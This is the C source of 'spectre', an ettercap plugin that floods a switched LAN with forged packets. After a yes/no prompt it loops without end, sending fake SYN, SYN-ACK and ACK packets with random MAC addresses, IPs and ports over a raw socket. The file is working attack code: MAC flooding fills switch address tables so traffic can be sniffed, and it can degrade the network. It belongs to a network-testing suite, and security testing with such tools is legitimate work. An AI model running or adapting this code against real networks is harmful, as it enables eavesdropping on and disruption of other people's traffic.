/*
    spectre -- ettercap plugin -- flood a switched LAN with random MAC addresses

    Copyright (C) 2001  NaGoR

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

    $Id: spectre.c,v 1.5 2002/02/10 10:07:01 alor Exp $
*/

#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/time.h>

#include "../../src/include/ec_main.h"
#include "../../src/include/ec_plugins.h"
#include "../../src/include/ec_inet_structures.h"
#include "../../src/include/ec_inet.h"
#include "../../src/include/ec_inet_forge.h"

// protos...

int Plugin_Init(void *);
int Plugin_Fini(void *);
int spectre_function(void *dummy);

// plugin operation

struct plugin_ops ops = {
   ettercap_version: VERSION,
   plug_info:        "Flood the LAN with random MAC addresses",
   plug_version:     13,
   plug_type:        PT_EXT,
   hook_point:       HOOK_NONE,
   hook_function:    &spectre_function,
};

//==================================

int Plugin_Init(void *params)
{
   return Plugin_Register(params, &ops);
}

int Plugin_Fini(void *params)
{
   return 0;
}

// =================================


int spectre_function(void *dummy)
{
   int sock, MTU;
   char c[2] = "";
   char *buf, *pck_to_send, cont[10];
   char MACS[6], MACD[6];
   u_long IPS, IPD;
   u_short PS, PD;
   u_long rnd;
   struct timeval seed;


   Plugin_Output("\nAre you sure you want to Flood the LAN with random MAC addresses ? (yes/no) ");
   Plugin_Input(cont, 5, P_BLOCK);
   if (strncmp(cont, "yes", 3))  // not sure... ;)
   {
      Plugin_Output("\nIt is safe!  for now...\n");
      return 0;
   }

   gettimeofday(&seed, NULL);
   srandom(seed.tv_sec ^ seed.tv_usec);

   sock = Inet_OpenRawSock(Options.netiface);
   Inet_GetIfaceInfo(Options.netiface, &MTU, NULL, NULL, NULL);

   buf = Inet_Forge_packet(MTU);

   Plugin_Output("\nFlooding the lan... (press return to exit)\n\n");

   loop
   {
      rnd = random();
      memcpy(MACS, &rnd, 4);
      memcpy(MACS + 4, &rnd, 2);

      rnd = random();
      memcpy(MACD, &rnd, 4);
      memcpy(MACD + 4, &rnd, 2);

      IPS = random();
      IPD = random();
      PD = random();
      PS = random();

      pck_to_send = buf;
      pck_to_send += Inet_Forge_ethernet( pck_to_send, MACS, MACD, ETH_P_IP );
      pck_to_send += Inet_Forge_ip( pck_to_send, IPS, IPD, TCP_HEADER, 0xe77e, 0, IPPROTO_TCP);
      Inet_Forge_tcp( pck_to_send, PS, PD, 0xabadc0de, 0xabadc0de, TH_SYN, 0, 0);
      Inet_SendRawPacket(sock, buf, ETH_HEADER + IP_HEADER + TCP_HEADER );

      pck_to_send = buf;
      pck_to_send += Inet_Forge_ethernet( pck_to_send, MACD, MACS, ETH_P_IP );
      pck_to_send += Inet_Forge_ip( pck_to_send, IPD, IPS, TCP_HEADER, 0xe77e, 0, IPPROTO_TCP);
      Inet_Forge_tcp( pck_to_send, PD, PS, 0xabadc0de, 0xabadc0de + 1, TH_SYN | TH_ACK, 0, 0);
      Inet_SendRawPacket(sock, buf, ETH_HEADER + IP_HEADER + TCP_HEADER );

      pck_to_send = buf;
      pck_to_send += Inet_Forge_ethernet( pck_to_send, MACS, MACD, ETH_P_IP );
      pck_to_send += Inet_Forge_ip( pck_to_send, IPS, IPD, TCP_HEADER, 0xe77e, 0, IPPROTO_TCP);
      Inet_Forge_tcp( pck_to_send, PS, PD, 0xabadc0de + 1, 0xabadc0de + 1, TH_ACK, 0, 0);
      Inet_SendRawPacket(sock, buf, ETH_HEADER + IP_HEADER + TCP_HEADER );

      if (Plugin_Input(c, 1, P_NONBLOCK))
      {
         Inet_Forge_packet_destroy( buf );
         Inet_CloseRawSock(sock);
         return 0;
      }
   }

}

/* EOF */
